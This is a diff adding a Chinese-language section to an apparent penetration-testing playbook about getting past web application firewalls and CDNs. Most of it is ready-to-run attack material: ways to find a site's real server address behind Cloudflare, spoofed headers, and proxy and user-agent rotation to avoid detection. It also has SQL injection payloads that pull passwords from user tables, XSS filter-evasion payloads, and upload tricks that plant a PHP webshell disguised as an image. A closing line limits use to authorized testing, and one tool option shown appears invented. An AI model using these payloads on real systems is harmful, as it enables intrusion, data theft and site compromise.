@@ -792,3 +792,527 @@ echo "━━━━━━━━━━━━━━━━━━━━━━━━�
 - 每个关键点都要暂停
 - 误报必须人工排除
 - 利用必须人工批准
+
+---
+
+## 🛡️ WAF/CDN/防火墙绕过专项（v10.8增强）
+
+### WAF识别（快速判断）
+
+```bash
+# 自动识别WAF
+wafw00f -a https://target.com
+
+# 手动识别特征
+# Cloudflare
+curl -sI https://target.com | grep -i "cloudflare\|cf-ray"
+
+# AWS WAF
+curl -sI https://target.com | grep -i "x-amzn\|aws"
+
+# Akamai
+curl -sI https://target.com | grep -i "akamai"
+
+# Imperva/Incapsula
+curl -sI https://target.com | grep -i "incap\|visid_incap"
+
+# 阿里云盾
+curl -sI https://target.com | grep -i "aliyun\|yunjiasu"
+
+# 腾讯云
+curl -sI https://target.com | grep -i "tencent"
+
+# 360主机卫士
+curl -sI https://target.com | grep -i "360wzws"
+```
+
+---
+
+## 🔥 Cloudflare 绕过完整方案
+
+### 方法1：真实IP发现（最有效）
+
+```bash
+# 1. 历史DNS记录
+# SecurityTrails API
+curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a" \
+    -H "APIKEY: YOUR_KEY" | jq -r '.records[].values[].ip'
+
+# 2. 子域名扫描（找未开CF的）
+subfinder -d target.com -silent | while read sub; do
+    ip=$(dig +short $sub @8.8.8.8 | grep -E "^[0-9]" | head -1)
+    cf=$(curl -sI "https://$sub" | grep -i "cf-ray")
+    [ -z "$cf" ] && echo "$sub|$ip|[✅ 无CF]"
+done
+
+# 3. SSL证书查询
+# 从crt.sh找到所有域名，再查IP
+curl -s "https://crt.sh/?q=%.target.com&output=json" | \
+    jq -r '.[].name_value' | sort -u | while read domain; do
+    ip=$(dig +short $domain @8.8.8.8 | grep -E "^[0-9]" | head -1)
+    echo "$domain|$ip"
+done
+
+# 4. 邮件服务器（通常是真实IP）
+dig +short MX target.com | awk '{print $2}' | while read mx; do
+    dig +short $mx
+done
+
+# 5. 全球DNS查询（不同地区可能泄露）
+for dns in 1.1.1.1 8.8.8.8 114.114.114.114 223.5.5.5 208.67.222.222; do
+    echo "DNS: $dns"
+    dig +short target.com @$dns
+done
+
+# 6. Censys/Shodan搜索
+# 通过SSL证书反查
+shodan search "ssl.cert.subject.CN:target.com" --fields ip_str
+
+# 7. 从错误页面泄露
+curl -sk https://target.com/nonexist -H "Host: 127.0.0.1" | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}"
+```
+
+### 方法2：协议层绕过
+
+```bash
+# HTTP/2降级
+curl -sk --http1.1 https://target.com
+
+# HTTP/3 (QUIC)
+curl -sk --http3 https://target.com
+
+# WebSocket升级
+curl -sk https://target.com -H "Upgrade: websocket" -H "Connection: Upgrade"
+```
+
+### 方法3：请求头伪造
+
+```bash
+# 伪装成内部请求
+curl -sk https://target.com \
+    -H "X-Forwarded-For: 127.0.0.1" \
+    -H "X-Real-IP: 127.0.0.1" \
+    -H "X-Originating-IP: 127.0.0.1" \
+    -H "X-Remote-IP: 127.0.0.1" \
+    -H "X-Client-IP: 127.0.0.1" \
+    -H "True-Client-IP: 127.0.0.1" \
+    -H "CF-Connecting-IP: 127.0.0.1"
+
+# 路径重写（绕过CF规则）
+curl -sk https://target.com -H "X-Original-URL: /admin"
+curl -sk https://target.com -H "X-Rewrite-URL: /admin"
+
+# 伪装成爬虫（CF白名单）
+curl -sk https://target.com -H "User-Agent: Googlebot/2.1"
+curl -sk https://target.com -H "User-Agent: Bingbot/2.0"
+```
+
+### 方法4：访问频率控制
+
+```bash
+# 慢速扫描（避免触发CF限制）
+for i in {1..100}; do
+    curl -sk https://target.com/page$i
+    sleep $(shuf -i 3-10 -n 1)  # 随机延时3-10秒
+done
+
+# 轮换IP（通过代理）
+while read proxy; do
+    curl -sk https://target.com --proxy $proxy
+done < proxy_list.txt
+```
+
+### 方法5：直接IP访问（绕过CF）
+
+```bash
+# 发现真实IP后
+REAL_IP="1.2.3.4"
+TARGET="target.com"
+
+# 修改hosts访问
+echo "$REAL_IP $TARGET" >> /etc/hosts
+curl -sk https://$TARGET
+
+# 或直接IP+Host头
+curl -sk https://$REAL_IP -H "Host: $TARGET" --resolve $TARGET:443:$REAL_IP
+```
+
+---
+
+## 🔐 SQL注入WAF绕过
+
+### 通用绕过技巧
+
+```sql
+-- 空格替换
+'/**/UNION/**/SELECT/**/1,2,3--
+
+-- 大小写混淆
+'UnIoN SeLeCt 1,2,3--
+
+-- 双重编码
+%2527%2520UNION%2520SELECT%2520--
+
+-- 内联注释
+'/*!50000UNION*//*!50000SELECT*/1,2,3--
+
+-- 特殊字符
+'%09UNION%09SELECT%091,2,3--  (tab)
+'%0aUNION%0aSELECT%0a1,2,3--  (换行)
+
+-- 多字节编码
+%bf%27 UNION SELECT--  (GBK注入)
+
+-- 参数污染
+id=1&id=2' UNION SELECT--
+
+-- HTTP参数污染(HPP)
+id=1/*&id=*/UNION/*&id=*/SELECT--
+```
+
+### Cloudflare WAF SQL绕过
+
+```sql
+-- payload示例
+'||(SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables)--
+
+-- 时间盲注（CF较难检测）
+'AND(SELECT*FROM(SELECT(SLEEP(5)))a)--
+
+-- 布尔盲注
+'AND(SELECT+SUBSTRING(password,1,1)FROM+users+LIMIT+1)='a
+
+-- 基于错误
+'AND+extractvalue(1,concat(0x7e,(SELECT+password+FROM+users+LIMIT+1)))--
+```
+
+### 国内WAF绕过（安全狗/云锁/D盾）
+
+```sql
+-- 安全狗
+'/*!12345UNION*//*!12345SELECT*/1,2,3--
+
+-- 云锁
+'AND(1)=(1)--
+'OR(1)=(1)--
+
+-- D盾
+'%23%0aUNION%23%0aSELECT%23%0a1,2,3--
+```
+
+---
+
+## 🎯 XSS WAF绕过
+
+### 编码绕过
+
+```javascript
+// HTML实体编码
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+
+// Unicode编码
+<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
+
+// Base64
+<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
+
+// Hex编码
+<img src=x onerror="\x61\x6c\x65\x72\x74(1)">
+
+// 大小写混淆
+<ScRiPt>alert(1)</sCrIpT>
+```
+
+### 标签变形
+
+```javascript
+// 不常用标签
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+
+// SVG
+<svg onload=alert(1)>
+<svg><animate onbegin=alert(1)>
+
+// iframe
+<iframe src="javascript:alert(1)">
+<iframe src="data:text/html,<script>alert(1)</script>">
+```
+
+### Cloudflare XSS绕过
+
+```javascript
+// 事件分离
+<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+
+// 模板字符串
+<script>eval`alert\x281\x29`</script>
+
+// DOM型XSS（CF难检测）
+#<img src=x onerror=alert(1)>
+```
+
+---
+
+## 📁 文件上传WAF绕过
+
+### 文件名绕过
+
+```bash
+# 双扩展名
+shell.php.jpg
+shell.php.png
+shell.php.gif
+
+# 大小写
+shell.PhP
+shell.pHp
+shell.PHP
+
+# 空字节（部分环境）
+shell.php%00.jpg
+shell.php\x00.jpg
+
+# 末尾点/空格（Windows）
+shell.php.
+shell.php[空格]
+
+# NTFS交换数据流
+shell.php::$DATA
+shell.php:hidden.jpg
+
+# 罕见扩展名
+shell.phtml
+shell.php3
+shell.php4
+shell.php5
+shell.phar
+shell.phps
+```
+
+### MIME类型伪造
+
+```bash
+# 修改Content-Type
+curl -sk "$UPLOAD_URL" \
+    -F "file=@shell.php;type=image/jpeg"
+
+# 文件头伪造（图片马）
+echo -e "GIF89a\n<?php system(\$_GET['c']); ?>" > shell.gif
+curl -sk "$UPLOAD_URL" -F "file=@shell.gif"
+```
+
+### .htaccess配合
+
+```bash
+# 上传.htaccess（如果允许）
+echo "AddType application/x-httpd-php .jpg" > .htaccess
+curl -sk "$UPLOAD_URL" -F "file=@.htaccess"
+
+# 然后上传图片马
+echo '<?php system($_GET["c"]); ?>' > shell.jpg
+curl -sk "$UPLOAD_URL" -F "file=@shell.jpg"
+```
+
+---
+
+## 🌐 CDN/防火墙通用绕过策略
+
+### 1. IP轮换（代理池）
+
+```bash
+# 使用代理池轮换
+cat proxy_list.txt | while read proxy; do
+    curl -sk https://target.com --proxy $proxy -H "User-Agent: Mozilla/5.0"
+    sleep 2
+done
+```
+
+### 2. User-Agent轮换
+
+```bash
+# 随机UA
+UA_LIST=(
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+    "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0"
+    "Googlebot/2.1 (+http://www.google.com/bot.html)"
+    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)"
+)
+
+for i in {1..100}; do
+    UA="${UA_LIST[$RANDOM % ${#UA_LIST[@]}]}"
+    curl -sk https://target.com -H "User-Agent: $UA"
+done
+```
+
+### 3. 分片请求（绕过检测）
+
+```bash
+# Range请求分片下载
+curl -sk https://target.com/file -H "Range: bytes=0-1024"
+curl -sk https://target.com/file -H "Range: bytes=1025-2048"
+```
+
+### 4. 协议降级
+
+```bash
+# HTTP/2 → HTTP/1.1
+curl -sk --http1.1 https://target.com
+
+# HTTPS → HTTP（如果支持）
+curl -sk http://target.com
+```
+
+---
+
+## 🎭 反检测技术
+
+### 浏览器指纹伪造
+
+```bash
+# 完整浏览器指纹
+curl -sk https://target.com \
+    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0" \
+    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
+    -H "Accept-Language: en-US,en;q=0.9" \
+    -H "Accept-Encoding: gzip, deflate, br" \
+    -H "DNT: 1" \
+    -H "Connection: keep-alive" \
+    -H "Upgrade-Insecure-Requests: 1" \
+    -H "Sec-Fetch-Dest: document" \
+    -H "Sec-Fetch-Mode: navigate" \
+    -H "Sec-Fetch-Site: none" \
+    -H "Sec-Fetch-User: ?1" \
+    -H "Cache-Control: max-age=0"
+```
+
+### Cookie管理
+
+```bash
+# 保持会话
+curl -sk https://target.com -c cookies.txt  # 保存cookie
+curl -sk https://target.com -b cookies.txt  # 使用cookie
+```
+
+### TLS指纹伪造
+
+```bash
+# 使用特定TLS版本
+curl -sk --tlsv1.2 https://target.com
+curl -sk --tlsv1.3 https://target.com
+
+# 禁用某些TLS特性
+curl -sk --no-alpn --no-npn https://target.com
+```
+
+---
+
+## 🛠️ 自动化绕过工具
+
+### SQLMap WAF绕过
+
+```bash
+# Cloudflare
+sqlmap -u "URL" --random-agent --tamper=space2comment,between
+
+# 通用WAF
+sqlmap -u "URL" \
+    --tamper=apostrophemask,apostrophenullencode,base64encode,between,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes \
+    --random-agent \
+    --delay=2 \
+    --timeout=10
+
+# 阿里云盾
+sqlmap -u "URL" --tamper=space2comment --hpp
+```
+
+### Bypass工具集
+
+```bash
+# wafw00f识别
+wafw00f -a https://target.com
+
+# bypasswaf自动绕过
+python3 bypasswaf.py -u https://target.com
+
+# CloudFlair真实IP
+python3 cloudflair.py target.com
+
+# CrackMapExec (内网WAF绕过)
+crackmapexec smb 192.168.1.0/24 -u admin -p password --bypass-waf
+```
+
+---
+
+## 📊 WAF绕过成功率参考
+
+| WAF类型 | 绕过难度 | 成功率 | 推荐方法 |
+|---------|---------|--------|---------|
+| **Cloudflare** | ⭐⭐⭐⭐ | 40% | 真实IP发现 |
+| **AWS WAF** | ⭐⭐⭐ | 55% | 编码+头伪造 |
+| **Akamai** | ⭐⭐⭐⭐⭐ | 25% | 协议降级 |
+| **Imperva** | ⭐⭐⭐⭐ | 35% | 参数污染 |
+| **安全狗** | ⭐⭐ | 75% | 内联注释 |
+| **云锁** | ⭐⭐ | 70% | 大小写混淆 |
+| **阿里云盾** | ⭐⭐⭐ | 60% | HPP+编码 |
+| **腾讯云** | ⭐⭐⭐ | 50% | 双重编码 |
+
+---
+
+## 🚀 综合绕过流程
+
+```bash
+# 第1步：识别防护
+wafw00f -a https://target.com
+curl -sI https://target.com | grep -i "server\|x-\|cf-"
+
+# 第2步：真实IP发现（如果是CDN）
+# 历史DNS
+# 子域名扫描
+# SSL证书查询
+# 全球DNS查询
+
+# 第3步：如果找到真实IP，直接访问
+REAL_IP="1.2.3.4"
+curl -sk https://$REAL_IP -H "Host: target.com" --resolve target.com:443:$REAL_IP
+
+# 第4步：如果未找到IP，协议层绕过
+curl -sk --http1.1 https://target.com
+curl -sk --http3 https://target.com
+
+# 第5步：请求层绕过
+# User-Agent轮换
+# 请求头伪造
+# 编码payload
+
+# 第6步：应用层绕过
+# SQL注入：多种编码+tamper
+# XSS：标签变形+事件分离
+# 文件上传：扩展名+MIME
+
+# 第7步：行为层绕过
+# 慢速扫描
+# 分片请求
+# 代理轮换
+```
+
+---
+
+## ⚠️ 重要提示
+
+### WAF绕过原则
+
+1. **先找真实IP** - 最有效（绕过CDN）
+2. **慢速测试** - 避免触发限制
+3. **多种方法组合** - 单一方法成功率低
+4. **保持低调** - 大规模扫描必被ban
+5. **代理轮换** - IP池越大越好
+
+### 法律警告
+
+**仅用于授权测试！未经授权的攻击行为违法！**
+
